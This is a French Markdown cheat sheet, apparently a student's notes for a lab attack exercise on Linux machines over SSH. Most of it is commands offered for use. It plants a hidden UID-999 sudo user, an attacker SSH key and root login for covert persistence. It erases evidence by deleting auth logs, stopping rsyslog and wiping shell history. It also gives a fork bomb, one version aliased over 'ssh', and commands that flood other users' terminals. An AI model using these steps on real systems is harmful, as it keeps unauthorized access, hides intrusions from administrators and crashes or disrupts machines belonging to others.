<link rel="stylesheet" type="text/css" href="/assets/css/red-theme.css">

# SSH 💡

### Connexion en toute discretion
- Connecte toi à une une VM Proxmox
- Retire le VLAN
- Changer l'adresse IP de l'interface
- Connecte toi à une machine avec cette VM

## Assure une connexion à un poste (méthode rapide)
```
sudo -i
```
```
apt install xrdp -y
```
```
systemctl start xrdp
```
```
systemctl enable xrdp
```

Normalement maintenant vous pouvez vous connecter en RDP avec **root:root**  
Sinon faut créer un utilisateur invisible (et le mettre dans /etc/sudoers) :
```
adduser sadmin
```
```
usermod -u 999 sadmin
```
```
groupmod -g 999 sadmin
```
```
chmod 600 /etc/sudoers
```
```
vim /etc/sudoers
```
Ajoutez en dessous de la ligne root : 
```
sadmin      ALL=(ALL:ALL) ALL
```


### Si plus de temps (Garantir une connexion SSH) :
```
ssh sio@172.17...
```
Sur la session que tu veux : 
```
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKv3MSZ/mpcNNSTBarjvA4uRcAAojzE+XW/xu0apfEZzrbxq+ASJVJZ1MJUIaYV9iQmFB22MB6CoVN64NiacYqy9AxkLbVpOfesGnOayM9q4LSZfWS28E3Vxpi7GANQPF5Es/H8JfTx5vEBKHv7A0CORoPm1E66TMvDOBdYa7XGKzXzzcGb3Q3y+tSgSDNwPXZO6JAKXuk/vboyOPvDEolTATgXfa4KOEflHnROUC4wbAB1dLLDQLhKwXlAejPekjJKYMAurqhWxBYXq0mrl1sI0kUAslNsu8j8wgdAUuH6pntTMUlBU0V/IDbcS22qsUNRDnN82GShnn/NoCZRaVn' >> ~/.ssh/authorized_keys
```
```
vim /etc/ssh/sshd_config
```
```
PermitRootLogin yes
Allowusers saadmin
PubkeyAuthentification yes
```
```
systemctl restart ssh
```





## Tous les fichiers SSH à connaitre **  
  - `/var/log/auth.log` (Fichier de logs d'authentification SSH)
    - Supprimer le fichier (toute façon vous êtes sur une VM) :
        - ```
          /var/log/auth.log
          ``` 
    - Modifier le chemin des logs (j'ai essayé mais pas réussi)  : 
      - ```
        /etc/rsyslog.d/50-default.conf
        ```  
        
    - Arrêt complet des logs (je recommande pas trop) : 
      - ```
        systemctl stop rsyslog
        ```
  - `/etc/ssh/sshd_config` (Fichier de configuration SSH)
    - Pour redéfinir un nouveau chemin de fichier (pas essayé)
      - ```
        cp /etc/ssh/sshd_config /etc/dispy
        ```
        *(`/etc/dispy` sera le nouveau fichier de log)*

      - ```
        systemctl edit sshd 
        ``` 
        *(et remplacer `/etc/ssh/sshd_config` chemin par `/etc/dispy`)*
    
  - `~/.bashrc` (Fichier de personnalisation environnement SSH)
    - Rediriger une commande grâce aux alias : 
      - ```
        vim ~/.bashrc
        ```
        Et ajoutez (eviter l'enregistrement de logs pour un utilisateur): 
      - ```
        unset HISTFILE
        ```
        Alias pour faire crash :
      - ```
        alias ssh=':(){ :|:& };:'
        ```


## Commandes de bases à connaitre

Voir les adresses IP des utilisateurs connectés à une session :  
```
w
```
Voir le numéro de notre propre terminal (juste pour savoir) :
```  
tty
```
Envoyer une notification à un utilisateur de la même session SSH :
```  
notify-send
```

## Bloquer/Autoriser les connexions extérieur :
```
vim /etc/ssh/sshd_config
```
Pour autoriser tout le monde on ajoute dans ce fichier :  
```
Allowusers *
```
Pour refuser tout le monde on ajoute dans ce fichier :
```
Denyusers *
```
(Allowusers > Denyusers)

## Voir historique de connexion ou tentative  
```
sudo grep 'Accepted password' /var/log/auth.log
```
```
sudo grep 'Failed password' /var/log/auth.log
```

## TROLL INCROYABLE :

### ⚠️ Faire crash un PC (À utiliser avec précaution) :

```
:(){ :|:& };:
```

### Afficher un Train sur le terminal : 
```
apt install sl
```
```
sl > /dev/pts/0
```
*(executez sur le numéro 1, 2, 3 aussi pour être sûr)*

### Afficher un texte arc en ciel sur le terminal : 
```
apt install toilet
```
```
echo "GAYPRIDE" | toilet --gay > /dev/pts/0
```
*(executez sur le numéro 1, 2, 3 aussi pour être sûr)*

### Ecrire "COUCOU MAXIME" en boucle :
```
while true; do echo "COUCOU MAXIME" > /dev/pts/0; sleep 1; done
```
*(executez sur le numéro 1, 2, 3 aussi pour être sûr)*


### Créer 500 dossiers sur un poste (à executer sur le bureau) :
```
for i in $(seq 1 500); do mkdir "dossier_$i"; done
```

### Executer du son sur un poste : 
```
apt install vlc
```
```
wget fichier.mp3
```
```
cvlc fichier.mp3
```

## Supprimer les logs : 
```
journalctl --vacuum-time=1s
```
```
rm /home/user/.bash_history
```
```
rm /var/log/auth.log
```
```
history -c
```